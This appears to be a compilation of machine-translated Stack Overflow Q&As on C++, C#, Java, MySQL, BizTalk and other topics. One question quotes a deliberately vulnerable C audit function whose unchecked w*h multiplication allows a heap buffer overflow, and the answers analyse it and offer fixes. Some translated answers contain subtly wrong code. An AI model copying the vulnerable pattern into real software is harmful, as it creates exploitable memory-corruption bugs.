## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T15:14:55.610

对于任何类型的事件挂钩，Render/RenderControl 通常都会迟到。尝试改用 PreRender。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T16:52:27.310

为了让您的下拉菜单能够接收事件，它必须作为某个控件集合中的控件存在。它还可能需要一个唯一的 ID（这取决于多种情况）。

现在，您将下拉列表呈现的 html 编写为文本。它可能有也可能没有 doPostBack 功能。如果确实如此，则框架无法处理它，因为没有控制可以处理。

由于 TreeNode 没有 Controls 集合，您可以尝试添加一个隐藏的下拉菜单，以您的方式呈现其余部分，并以这种方式欺骗框架。但是，这很棘手，因为您必须处理验证、可见性、ID 等。

您也可以尝试自己处理回发事件。假设您正确形成了 __doPostBack，在页面加载时检查 Request.Form["__EVENTTARGET"] 和 Request.Form["__EVENTARGUMENT"] 并进行相应处理。

您也可以尝试创建自己的树视图...

# c++ - 使用 value 累积 map 中元素的总和

> ID：721855
> 
> 赞同：6
> 
> 时间：2009-04-06T14:58:35.680
> 
> 标签：c++, algorithm, stl

说我有一个

```
struct SMyStruct 
{
   int MULT;
   int VAL;

};

std::map<std::string, SMyStuct*> _idToMyStructMap; 
```

现在我想计算所有 SMyStuct 的总和，其中总定义为 idToMyStructMap 中每个元素的 MULT1 *VAL1 + MULT2 *VAL2。

似乎累积功能是一个自然的选择。请建议。谢谢

**请不要Boost....只是一个'ld时尚stl**

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-04-06T15:09:16.900

```
typedef std::map< std::string, SMyStruct* > string_to_struct_t;

int add_to_totals( int total, const string_to_struct_t::value_type& data )
{
    return total + data.second->MULT * data.second->VAL; 
}

const int total = std::accumulate(
                         _idToMyStructMap.begin(),
                         _idToMyStructMap.end(),
                         0, 
                         add_to_totals ); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-04-06T15:11:29.487

主题的一个变体是为您的结构定义 operator+，然后在其默认模式下使用 std::accumulate 。

```
int & operator+ (const int &lhs, const SMyStruct &rhs){
    return lhs + (rhs.MULT * rhs.VALUE);
} 
```

然后：

```
std::accumulate(_idToMyStructMap.begin(), _idToMyStructMap.end(), 0); 
```

当然，如果`operator+`对您的结构通常有意义，那么您也需要添加重载以在左侧使用 SMyStruct，和/或将它们制作为模板，以便您获得 int、float、double、long 等的函数. 一口气。正如评论中提到的 jalf ，如果`operator+`（或它的这个版本）对您的结构通常没有意义，那么其他解决方案会更好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T19:55:12.800

您还可以将“取第二对”功能与“计算 MULT*VAL”和“向累加器添加内容”分开。

尽管您不需要提升来执行此操作，但他们已经创建了大量的“函数式”编程框架。如果你不能使用 boost，你需要一些你自己的模板魔法。不过也不算*太*复杂。

```
#include <map>
#include <algorithm>
#include <numeric>
#include <functional>
#include <iostream> 
```

现在我认为将乘法*放在*类中更好。

```
struct SMyStruct 
{
   int MULT;
   int VAL;
   long f() const { return MULT*VAL; }
}; 
```

为“采取第二对”创建一个通用函子：

```
// a 'take-second' functor
template< typename at_pair >
struct to_second_t : public std::unary_function< at_pair, typename at_pair::second_type > {
  const typename at_pair::second_type& operator()( const at_pair & p ) const {
    return p.second;
  }
}; 
```

这看起来很棘手，但这只是一种通用的说法：“先做这个，然后再做那个结果”：

```
// compose two functors (simplified)
template< typename at_F, typename at_G >
struct compose_t : public std::unary_function< typename at_F::argument_type, typename at_G::result_type >{
    at_F f;
    at_G g;
    compose_t( at_F& f, at_G& g ): f( f ), g(g) {}

    typename at_G::result_type operator()( const typename at_F::argument_type& v ) const {
        return g( f( v ) );
    }
};

template< typename at_F, typename at_G >
compose_t<at_F, at_G> compose( at_F& f, at_G& g ) { return compose_t<at_F,at_G>( f, g ); }

// compose two functors (a unary one, and a binary one)
//
template< typename at_F, typename at_G >
struct compose2_t : public std::binary_function< typename at_F::first_argument_type, typename at_G::argument_type, typename at_G::result_type >{
    at_F f;
    at_G g;
    compose2_t( at_F& f, at_G& g ): f( f ), g(g) {}

    typename at_G::result_type operator()( const typename at_F::first_argument_type& a1, const typename at_G::argument_type& v ) const {
        return f( a1, g( v ) );
    }
};

template< typename at_F, typename at_G >
compose2_t<at_F, at_G> compose2( at_F& f, at_G& g ) { return compose2_t<at_F,at_G>( f, g ); } 
```

最后，把这一切付诸实践：

```
int main()
{
  typedef std::map<int, SMyStruct > tMap; 
  tMap m;
  SMyStruct s = {1,2};
  m[1].VAL = 1; m[1].MULT = 3;
  m[2].VAL = 2; m[2].MULT = 10;
  m[3].VAL = 3; m[3].MULT = 2;

  // mind, this is not LISP (yet)
  long total = std::accumulate( m.begin(), m.end(), 0, 
    compose2( 
      std::plus<int>(),  
      compose( 
        to_second_t<tMap::value_type>(), 
        std::mem_fun_ref( &SMyStruct::f ) ) )
    );

  std::cout << "total: " << total <<std::endl;
  return 0;
} 
```

# mapping - BizTalk 2006 R2 映射问题

> ID：721857
> 
> 赞同：0
> 
> 时间：2009-04-06T14:58:49.437
> 
> 标签：mapping, biztalk

我有这些数据（所有元素都是可选的）：

```
<data>
<optionalElement1>...</optionalElement1>
<optionalElement2>...</optionalElement2>
<optionalElement3>...</optionalElement3>
</data> 
```

我需要将其映射到另一个模式（所有元素都是必需的）：

```
<request> 
<Element1>...</Element1>
<Element2>...</Element2>
<Element3>...</Element3>
</request> 
```

由于原始请求中的元素是可选的，因此映射只会为原始包含的元素生成对应的元素。但是请求的验证将失败。

例子：

```
<data>
<optionalElement3>
<value1>1</value1>
<value2>2</value2>
</optionalElement3>
</data> 
```

将映射到

```
<request>
<Element3>
<subelement1>1</subelement1>
<subelement2>2</subelement2>
</Element3>
</request> 
```

验证将失败，因为我缺少 Element1 和 Element2。回应应该是（我认为）：

```
<request>
<Element1 xsi:nil="true" />
<Element2 xsi:nil="true" />
<Element3>
<subelement1>1</subelement1>
<subelement2>2<subelement2>
</Element3>
</request> 
```

我怎样才能在映射中做到这一点？如何确保在输出消息中创建元素？

而且，顺便说一句，如果不存在子元素（比如说“data/optionalElement1/value1”，我如何确保创建了目标子元素“request/Element1/subelement1”？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-10-04T22:46:04.623

让它变得非常简单。使用 xlst 文件进行映射。

使用简单的 if 条件，您可以检查 opetion 元素的值是否存在，如果值存在则映射，否则映射空（空）值。因此，即使可选元素没有值，也会生成复杂元素。

希望它能解决你的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-07T21:51:54.303

何塞，

你会想看看表循环functoid。这是一篇关于它的帖子。

[http://geekswithblogs.net/Chilberto/archive/2008/04/16/121274.aspx](http://geekswithblogs.net/Chilberto/archive/2008/04/16/121274.aspx)

将此 functoid 与表提取一起使用应该可以为您提供解决方案。还有一个很好的系列了解映射器。

[http://www.bizbert.com/bizbert/2008/02/07/Understanding+The+BizTalk+Mapper+Part+1+Introduction.aspx](http://www.bizbert.com/bizbert/2008/02/07/Understanding+The+BizTalk+Mapper+Part+1+Introduction.aspx)

-布莱恩

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T15:13:43.553

您可以在映射器中完成所有这些操作。我已经有一段时间没有进入 Biztalk 并且我附近没有它，但我知道映射器中有一些功能可以让您检查是否存在所需的字段。根据这些字段的存在，您可以指定映射器的适当操作是什么。

您可以通过在目标模式中为字段提供默认值来强制创建字段。这也可以通过属性窗口使用映射器来完成。

# java - 使用 Apache POI 导入 CSV 数据

> ID：721859
> 
> 赞同：14
> 
> 时间：2009-04-06T14:59:51.277
> 
> 标签：java, excel, csv, apache-poi

如何使用 Apache POI 高效导入 CSV 数据？如果我有一个非常大的 CSV 文件要存储在我的 Excel 电子表格中，那么我不认为逐个单元格是导入的最佳方式......？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-07-06T16:42:47.737

Apache POI 从未设计为调用 CSV 文件。虽然可以在 Excel 中打开 CSV 文件，但 Excel 有自己的自动导入阅读器。这是假设您的 CSV 有`.csv`而不是`.txt`后缀。如果它有`.txt`后缀，请将其保存为`.csv.`全部，然后您只需右键单击 CSV 并使用 Excel 打开。Presto，CSV 已导入 Excel。

我假设您想要将 txt 文件中的数据解析为 Excel 文件。如果是这种情况，我建议您使用像[SuperCSV](http://supercsv.sourceforge.net/)这样的库，而不是试图让 POI 做一些它从未设计过的事情。它会在解析数据时将其全部加载到您选择的 Bean、Map 或 List 中，然后您可以将其以您选择的格式写回`.csv`文件中，或者使用 JDBC-ODBC Bridge 或 Apache POI 直接写入进入并`.XLS`格式化。添加一个额外的步骤，但您可以完全控制数据。

SuperCSV 带有 Apache2 许可证，因此它应该适用于您选择使用它做的任何事情。

或者只是使用`split`Java 中的函数并将 CSV 解析为数组并`.xls`使用 POI 将数组加载到其中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-03-15T11:05:07.603

对 CSV 文件使用 apache commons-csv。使用以下依赖项更新您的 pom.xml

```
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-csv</artifactId>
    <version>1.5</version>
</dependency> 
```

您可以从中找到有用的好例子 -[点击这里](https://www.callicoder.com/java-read-write-csv-file-apache-commons-csv/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-07-27T06:07:57.657

我们根据文件扩展名编写java代码。这里我们处理 .csv 扩展名，这里是处理它的 Apache POI 代码。我们拆分内容并存储在 Array 中，然后使用它。

```
CSVParser parser = new CSVParser(new FileReader("D:/your_file.csv"), CSVFormat.DEFAULT);
List<CSVRecord> list = parser.getRecords();
for (CSVRecord record : list) {
    String[] arr = new String[record.size()];
    int i = 0;
    for (String str : rec) {
        arr[i++] = str;
    }
}  
parser.close(); 
```

相关的Maven依赖：

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.2</version>
</dependency>
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-csv</artifactId>
    <version>1.5</version>
</dependency>
<dependency>
    <groupId>com.opencsv</groupId>
    <artifactId>opencsv</artifactId>
    <version>4.2</version>
</dependency> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-07T14:12:36.937

向 Excel 电子表格添加信息的最有效方法是使用数组。这段代码：

```
Sheets(1).Range("A1").Resize(uBound(myArray),uBound(myArray,2)).Value = myArray 
```

从二维数组填充工作表范围，其中下限为 1。

在您的情况下，我会先将 CSV 文件读入一个数组，然后使用上述语法将其放在工作表上。

斯坦·斯科特

# c++ - 如果整数溢出， (unsigned int) * (int) 的结果是什么？无符号或整数？

> ID：721861
> 
> 赞同：8
> 
> 时间：2009-04-06T15:01:18.713
> 
> 标签：c++, c, overflow, buffer

如果整数溢出，结果是`(unsigned int) * (int)`什么？`unsigned`还是`int`？数组索引运算符 ( `operator[]`) 对`char*`:`int`或`unsigned int`其他东西采用什么类型？

我正在审计下面的函数，突然出现了这个问题。该函数在第 17 行有一个漏洞。

```
// Create a character array and initialize it with init[] 
// repeatedly. The size of this character array is specified by 
// w*h.
char *function4(unsigned int w, unsigned int h, char *init)
{
    char *buf;
    int i;

    if (w*h > 4096)
        return (NULL);

    buf = (char *)malloc(4096+1);
    if (!buf)
        return (NULL);

    for (i=0; i<h; i++)
        memcpy(&buf[i*w], init, w);  // line 17

    buf[4096] = '\0';

    return buf;
} 
```

考虑两者`w`和`h`都是非常大的无符号整数。第 9 行的乘法有机会通过验证。

`int i`现在问题出现在第 17 行。乘以`unsigned int w`：如果结果是`int`，则乘积可能是负数，导致访问的位置是 before `buf`。如果结果为`unsigned int`，则乘积将始终为正，从而访问位于 之后的位置`buf`。

很难编写代码来证明这一点：`int`太大。有人对此有想法吗？

是否有任何文件说明产品的类型？我已经搜索过了，但到目前为止还没有找到任何东西。

我想就漏洞而言，是否`(unsigned int) * (int)`产生`unsigned int`或`int`无关紧要，因为在编译的目标文件中，它们只是字节。无论产品类型如何，以下代码的工作方式都相同：

```
unsigned int x = 10;
int y = -10;

printf("%d\n", x * y);  // print x * y in signed integer
printf("%u\n", x * y);  // print x * y in unsigned integer 
```

因此，乘法返回什么类型并不重要。消费者功能是否采用`int`或很重要`unsigned`。

这里的问题**不是**功能有多糟糕，或者如何改进功能以使其更好。该功能无疑存在漏洞。问题是关于函数的确切行为，基于标准中规定的行为。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T15:13:05.537

在 long long 中进行 w*h 计算，检查是否大于 MAX_UINT

编辑：替代：如果溢出 (w*h)/h != w （总是这样吗？！应该是，对吧？）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T15:08:59.867

通过限制 w 和 h 确保 w * h 不会溢出。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T15:31:56.393

要回答您的问题：将 int 和 unsigned int 相乘的表达式的类型将是 C/C++ 中的 unsigned int。

要回答您隐含的问题，处理整数算术中可能的溢出的一种体面方法是使用`IntSafe`Microsoft 的 " " 例程集：

[http://blogs.msdn.com/michael_howard/archive/2006/02/02/523392.aspx](http://blogs.msdn.com/michael_howard/archive/2006/02/02/523392.aspx)

它在 SDK 中可用并包含内联实现，因此如果您在另一个平台上，您可以研究它们在做什么。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T15:38:13.227

在您的情况下，类型`w*i`是无符号的。如果我正确阅读了标准，则规则是将操作数转换为较大的类型（具有其符号性），或与有符号类型相对应的无符号类型（`unsigned int`在您的情况下）。

但是，即使它是无符号的，它也不会阻止回绕（在 之前写入内存`buf`），因为可能是这种情况（在 i386 平台上是这样），这`p[-1]`与`p[-1u]`. 无论如何，在您的情况下，两者都是`buf[-1]`未定义`buf[big unsigned number]`的行为，因此签名/未签名的问题并不那么重要。

请注意，签名/未签名在其他情况下很重要 - 例如。根据和`(int)(x*y/2)`的类型给出不同的结果，即使没有未定义的行为。`x``y`

我将通过检查第 9 行的溢出来解决您的问题；因为 4096 是一个非常小的常数，并且 4096*4096 在大多数架构上都不会溢出（你需要检查），所以我会这样做

```
if (w>4096 || h>4096 || w*h > 4096)
     return (NULL); 
```

这忽略了`w`or`h`为 0 的情况，如果需要，您可能需要检查它。

一般来说，您可以像这样检查溢出：

```
if(w*h > 4096 || (w*h)/w!=h || (w*h)%w!=0) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-06T15:40:06.517

在 C/C++ 中，`p[n]`符号实际上是编写的快捷方式`*(p+n)`，并且此指针算术考虑了符号。So`p[-1]`是有效的，并且指的是紧接在 之前的值`*p`。

所以符号在这里真的很重要，整数算术运算符的结果遵循标准定义的一组规则，这称为整数提升。

查看此页面：[INT02-C。了解整数转换规则](https://www.securecoding.cert.org/confluence/display/seccode/INT02-C.+Understand+integer+conversion+rules)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-06T15:30:26.007

2 项更改使其更安全：

```
if (w >= 4096 || h >= 4096 || w*h > 4096)  return NULL;

...

unsigned i; 
```

另请注意，在缓冲区结束后写入或读取并不是一个坏主意。所以问题不是 i *w 是否会变成负数，而是 0 <= i* h +w <= 4096 是否成立。

所以重要的不是类型，而是 h*i 的结果。例如，它是 (unsigned)0x80000000 还是 (int)0x80000000 都没有区别，程序无论如何都会出现 seg-fault。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T15:58:58.310

对于 C，请参阅“通常的算术转换”（C99：第 6.3.1.8 节，ANSI C K&R A6.5）了解如何处理数学运算符的操作数的详细信息。

在您的示例中，适用以下规则：

C99：

> 否则，如果有符号整数类型的操作数的类型可以表示无符号整数类型的操作数类型的所有值，则将无符号整数类型的操作数转换为有符号整数类型的操作数的类型。
> 
> 否则，两个操作数都转换为与带符号整数类型的操作数类型对应的无符号整数类型。

ANSI C：

> 否则，如果任一操作数为 unsigned int，则将另一个操作数转换为 unsigned int。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-06T15:07:22.990

为什么不直接将 i 声明为 unsigned int？然后问题就消失了。

在任何情况下，i*w 都保证为 <= 4096，因为代码对此进行了测试，因此它永远不会溢出。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-04-06T15:11:18.347

memcpy(&buf[i *w > -1 ? i* w < 4097? i *w : 0 : 0], init, w); 我不认为 i* w 的三重计算会降低性能）

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-04-06T15:20:45.547

如果 w 和/或 h 足够大并且可以通过以下验证，则 w*h 可能会溢出。

```
9\.      if (w*h > 4096)
10\.         return (NULL); 
```

在 int 、 unsigned int 混合操作中，int 提升为 unsigned int，在这种情况下，“i”的负值将变为较大的正值。在这种情况下

```
&buf[i*w] 
```

将访问超出范围的值。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-04-06T15:21:41.553

无符号算术是作为模块化（或环绕）完成的，因此两个大型无符号整数的乘积很容易小于 4096。 int 和 unsigned int 的乘法将导致 unsigned int （参见 C++ 标准的第 4.5 节） .

因此，给定较大的 w 和合适的 h 值，您确实会遇到麻烦。

确保整数算术不会溢出是困难的。一种简单的方法是转换为浮点并进行浮点乘法，然后查看结果是否合理。正如 qwerty 建议的那样，如果在您的实现中可用，那么 long long 将是可用的。（它是 C90 和 C++ 中的常见扩展，确实存在于 C99 中，并将在 C++0x 中。）

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2010-09-18T01:11:07.347

当前的 C1X 草案中有 3 段关于计算 (UNSIGNED TYPE1) X (SIGNED TYPE2) 在 6.3.1.8 通常的算术覆盖，N1494，

[WG 14：C - 项目状态和里程碑](http://www.open-std.org/jtc1/sc22/wg14/www/projects)

> 否则，如果无符号整数类型的操作数的等级大于或等于另一个操作数类型的等级，则将有符号整数类型的操作数转换为无符号整数类型的操作数的类型。
> 
> 否则，如果有符号整数类型的操作数的类型可以表示无符号整数类型的操作数类型的所有值，则将无符号整数类型的操作数转换为有符号整数类型的操作数的类型。
> 
> 否则，两个操作数都转换为与带符号整数类型的操作数类型对应的无符号整数类型。

因此，如果 a 是 unsigned int 且 b 是 int，则 (a * b) 的解析应生成代码 (a * (unsigned int)b)。如果 b < 0 或 a * b > UINT_MAX 将溢出。

如果 a 是 unsigned int 并且 b 是更大的 long，则 (a * b) 应该生成 ((long)a * (long)b)。如果 a * b > LONG_MAX 或 a * b < LONG_MIN 将溢出。

如果 a 是 unsigned int 且 b 是大小相同的 long，则 (a * b) 应该生成 ((unsigned long)a * (unsigned long)b)。如果 b < 0 或 a * b > ULONG_MAX 将溢出。

关于“索引器”预期类型的​​第二个问题，答案显示为“整数类型”，它允许任何（有符号）整数索引。

> 6.5.2.1 数组下标
> 
> 约束
> 
> 1 一个表达式的类型应为“指向完整对象类型的指针”，另一个表达式应为整数类型，结果的类型为“类型”。
> 
> 语义
> 
> 2 后缀表达式后跟方括号 [] 中的表达式是数组对象元素的下标名称。下标运算符[]的定义是E1[E2]等同于(*((E1)+(E2)))。由于适用于二元 + 运算符的转换规则，如果 E1 是数组对象（等效地，指向数组对象的初始元素的指针）并且 E2 是整数，则 E1[E2] 指定第 E2 个元素E1（从零开始计数）。

当指针表达式是数组变量并且索引可能为负时，由编译器执行静态分析并警告开发人员缓冲区溢出的可能性。即使索引为正数或无符号数，也会警告可能的数组大小溢出。

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2009-04-06T15:19:26.177

要真正回答您的问题，而不指定您正在运行的硬件，您不知道，并且在旨在可移植的代码中，您不应该依赖任何特定行为。

# javascript - 如何使用 jquery 控制字符数（数字）

> ID：721864
> 
> 赞同：0
> 
> 时间：2009-04-06T15:02:07.153
> 
> 标签：javascript, jquery

我需要使用 jquery 控制输入字段中的字符数......我已经得到了一些控制但是，我不知道还能做什么......

```
var foo = function(){
    if($('#foo1').val() == ''){
        $('.foo_foo_c').load('../html/message_error_number.html');
    }else{
        $('.foo_foo_c').load('../html/foo_foo.html',function(){
            listaStyle();
            listaPagadasStyle();
            listaDetalleLlamadasStyle();
        });
    }

}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T15:39:10.323

查看使用 jQuery[验证](http://docs.jquery.com/Plugins/Validation)插件并设置[maxLength](http://docs.jquery.com/Plugins/Validation/Methods/maxlength#length)或[rangeLength](http://docs.jquery.com/Plugins/Validation/Methods/rangelength#range)规则，除了要求它是一个[数字](http://docs.jquery.com/Plugins/Validation/Methods/number)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T15:06:25.427

我想你想要像[字母数字](http://itgroup.com.ph/alphanumeric/)插件这样的东西。

# mysql - MySQL - 从字符串中提取数字

> ID：721866
> 
> 赞同：2
> 
> 时间：2009-04-06T15:02:29.523
> 
> 标签：mysql, string

在 MySQL 数据库中，我有一个包含 itemID、itemName 和其他一些字段的表。

示例记录（分别为 itemID 和 itemName）：

> vaX652bp_X987_foobar, FooBarItem
> X34_bar, BarItem
> tooX56, TOOX_What

我想写一个查询，它给我一个像这样的输出：

652，FooBarItem
34，BarItem
56，TOOX_What

换句话说，我想从 itemID 列中提取数字。但条件是提取的数字应该是在 itemID 列中第一次出现字符“X”之后出现的数字。

我目前正在尝试 locate() 和 substring() 但无法（还）实现我想要的..

~~**编辑：** 与问题无关 - 任何人都可以看到这个问题的所有答案（目前是两个）吗？我只看到“灵魂融合”的第一个答案。任何想法为什么？还有百万美元的问题——我是不是发现了一个错误？！~~

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T15:12:04.243

这在 mysql 中是一件可怕的事情，因为它不支持提取正则表达式匹配。我宁愿建议将数据提取到您选择的语言中并在那里进行处理。如果您真的*必须*在 mysql 中执行此操作，那么我唯一能想到的就是使用[LOCATE](http://dev.mysql.com/doc/refman/5.1/en/string-functions.html)和[SUBSTRING](http://dev.mysql.com/doc/refman/5.1/en/string-functions.html)与多个[CASE](http://dev.mysql.com/doc/refman/5.1/en/control-flow-functions.html)的不可读组合。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-22T18:44:16.817

为什么不尝试在插入记录时（在 PHP 中分隔数字左右）单独存储数字的第三列。所以这样你就可以使用更多的空间来节省大量的处理。

桌子：

vaX652bp_X987_foobar, 652, FooBarItem

X34_bar, 34, BarItem

太X56, 56, TOOX_What

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-19T14:50:06.143

这不是那么难以理解：

```
SELECT 0+SUBSTRING(itemID, LOCATE("X", itemID)+1), itemName FROM tableName 
```

# apache-flex - Adobe Flex / as3：如何实现自定义拖放光标

> ID：721868
> 
> 赞同：4
> 
> 时间：2009-04-06T15:02:52.907
> 
> 标签：apache-flex, drag-and-drop, adobe, cursors

我们的产品团队在拖放操作期间要求自定义光标。他们为我提供了三个图像来实现：

*   **Open-Hand-Grabber.png**：当用户将鼠标悬停在他们可以拖动的项目上时显示
*   **Closed-Hand-Grabber.png** : 正在拖动项目
*   **Closed-Hand-Grabber-No-Drop** : 将项目拖到无法放下的区域

我已将这些图像嵌入到 Flex 应用程序中，现在我正在尝试实现所需的行为。

我的第一个想法是监听拖放事件并使用 CursorManager.setCursor() 方法设置光标。这个解决方案看起来代码非常密集，我觉得必须有一种更简单的方法来为各种拖放光标状态设置皮肤。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-04-06T15:55:32.593

查看 DragManager 类中可用的各种光标样式：

复制光标

默认拖动图像皮肤

链接光标

移动光标

拒绝光标

[http://livedocs.adobe.com/flex/3/langref/mx/managers/DragManager.html](http://livedocs.adobe.com/flex/3/langref/mx/managers/DragManager.html)

# c# - 如何从字符串表示中获取通用类型？

> ID：721870
> 
> 赞同：80
> 
> 时间：2009-04-06T15:03:52.843
> 
> 标签：c#, reflection, types

我有`MyClass<T>`。

然后我有这个`string s = "MyClass<AnotherClass>";`。如何从字符串中获取类型`s`？

一种方法（丑陋）是解析出“<”和“>”并执行以下操作：

```
Type acType = Type.GetType("AnotherClass");  
Type whatIwant = typeof (MyClass<>).MakeGenericType(acType); 
```

但是有没有一种更简洁的方法来获得最终类型而无需任何解析等？

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2009-04-06T15:36:22.250

[泛型](http://msdn.microsoft.com/en-us/library/w3f99sx1.aspx)的格式是名称、一个 ` 字符、类型参数的数量，然后是括号中类型的逗号分隔列表：

```
Type.GetType("System.Collections.Generic.IEnumerable`1[System.String]"); 
```

我不确定是否有一种简单的方法可以将泛型的 C# 语法转换为 CLR 想要的那种字符串。我开始编写一个快速的正则表达式来解析它，就像您在问题中提到的那样，但意识到除非您放弃将嵌套泛型作为类型参数的能力，否则解析将变得非常复杂。

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2009-04-06T15:06:52.353

签出`Activator.CreateInstance`- 您可以使用类型调用它

```
Activator.CreateInstance(typeof(MyType)) 
```

或使用程序集和类型名称作为`string`

```
Activator.CreateInstance("myAssembly", "myType") 
```

这将为您提供所需类型的实例。

如果您需要`Type`而不是实例，请使用`Type.GetType()`您感兴趣的类型的方法和完全限定名称，例如：

```
string s = "System.Text.StringBuilder";
Type myClassType = Type.GetType(s); 
```

那会给你有`Type`问题的。

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2011-02-09T14:00:31.683

我需要这样的东西，最后我写了一些代码来解析我需要的简单类型名称。当然还有改进的余地，因为它不会识别像 , 这样的泛型类型名称，但它对,等`List<string>`很好。分享以防万一这对任何人都有帮助。`string``int[]``decimal?`

```
public static class TypeExtensions
{
  public static Type GetTypeFromSimpleName(string typeName)
  {
    if (typeName == null)
      throw new ArgumentNullException("typeName");

    bool isArray = false, isNullable = false;

    if (typeName.IndexOf("[]") != -1)
    {
      isArray = true;
      typeName = typeName.Remove(typeName.IndexOf("[]"), 2);
    }

    if (typeName.IndexOf("?") != -1)
    {
      isNullable = true;
      typeName = typeName.Remove(typeName.IndexOf("?"), 1);
    }

    typeName = typeName.ToLower();

    string parsedTypeName = null;
    switch (typeName)
    {
      case "bool":
      case "boolean":
        parsedTypeName = "System.Boolean";
        break;
      case "byte":
        parsedTypeName = "System.Byte";
        break;
      case "char":
        parsedTypeName = "System.Char";
        break;
      case "datetime":
        parsedTypeName = "System.DateTime";
        break;
      case "datetimeoffset":
        parsedTypeName = "System.DateTimeOffset";
        break;
      case "decimal":
        parsedTypeName = "System.Decimal";
        break;
      case "double":
        parsedTypeName = "System.Double";
        break;
      case "float":
        parsedTypeName = "System.Single";
        break;
      case "int16":
      case "short":
        parsedTypeName = "System.Int16";
        break;
      case "int32":
      case "int":
        parsedTypeName = "System.Int32";
        break;
      case "int64":
      case "long":
        parsedTypeName = "System.Int64";
        break;
      case "object":
        parsedTypeName = "System.Object";
        break;
      case "sbyte":
        parsedTypeName = "System.SByte";
        break;
      case "string":
        parsedTypeName = "System.String";
        break;
      case "timespan":
        parsedTypeName = "System.TimeSpan";
        break;
      case "uint16":
      case "ushort":
        parsedTypeName = "System.UInt16";
        break;
      case "uint32":
      case "uint":
        parsedTypeName = "System.UInt32";
        break;
      case "uint64":
      case "ulong":
        parsedTypeName = "System.UInt64";
        break;
    }

    if (parsedTypeName != null)
    {
      if (isArray)
        parsedTypeName = parsedTypeName + "[]";

      if (isNullable)
        parsedTypeName = String.Concat("System.Nullable`1[", parsedTypeName, "]");
    }
    else
      parsedTypeName = typeName;

    // Expected to throw an exception in case the type has not been recognized.
    return Type.GetType(parsedTypeName);
  }
} 
```

使用它就像写这个一样简单：

```
Type t;

t = TypeExtensions.GetTypeFromSimpleName("string");
t = TypeExtensions.GetTypeFromSimpleName("int[]");
t = TypeExtensions.GetTypeFromSimpleName("decimal?"); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T15:12:02.247

要从字符串中获取类型对象，请使用：

```
Type mytype = Type.GetType(typeName); 
```

然后，您可以将其传递给`Activator.CreateInstance()`：

```
Activator.CreateInstance(mytype); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T15:10:04.950

我没有太多时间来解析这个，尽管我想我已经看到了一些类似的答案。特别是，我认为他们正在做你想做的事情：

[实体框架通用存储库错误](https://stackoverflow.com/questions/695878/entity-framework-generic-repository-error/698365)

```
(String.Format("[{0}]", baseType.Name.ToString())).OfType<T>(); 
```

希望这会有所帮助，如果不是，请让我更具体地知道。

# entity-framework - 实体框架和字符串键之间的关联

> ID：721873
> 
> 赞同：3
> 
> 时间：2009-04-06T15:04:54.587
> 
> 标签：entity-framework, primary-key, case-insensitive, natural-key

我是实体框架的新手，并且是那个mather的ORM。在我参与的项目中，我们有一个遗留数据库，它的所有键都是字符串，不区分大小写。

我们正在转换为 MSSQL 并希望将 EF 用作 ORM，但遇到了问题。

这是一个说明我们的问题的例子：

TableA 有一个主字符串键，TableB 有一个对该主键的引用。

在 LINQ 中，我们编写如下内容：

```
 var result = from t in context.TableB select t.TableA;
foreach( var r in result )
    Console.WriteLine( r.someFieldInTableA ); 
```

如果 TableA 包含读取“A”的主键，并且 TableB 包含引用 TableA 但在引用字段“a”和“A”中具有不同大小写的两行。

在我们的项目中，我们希望两行都出现在结果中，但只有匹配大小写的行才会出现在结果中。

使用 SQL Profiler，我注意到两行都被选中。

有没有办法告诉实体框架键不区分大小写？

**编辑：**
我们现在已经用 NHibernate 对此进行了测试，并得出结论 NHibernate 可以使用不区分大小写的键。所以 NHibernate 对我们来说可能是一个更好的选择。
然而，我仍然有兴趣找出是否有任何方法可以改变实体框架的行为。

* * *

感谢您的回答！

问题是，如果我们现在将该约束添加到数据库，遗留应用程序可能会因为它的构建方式而停止工作。如果可能的话，对我们来说最好的办法是改变 EF 的行为。我猜这是不可能的，但我正在试一试。

问候，
弗雷德里克

**编辑：**我为自己的问题添加答案的原因是我在成为注册用户之前添加了这个问题，并且当我注册了我的帐户时，我无法添加评论或编辑我的帖子。现在帐户已合并。

* * *

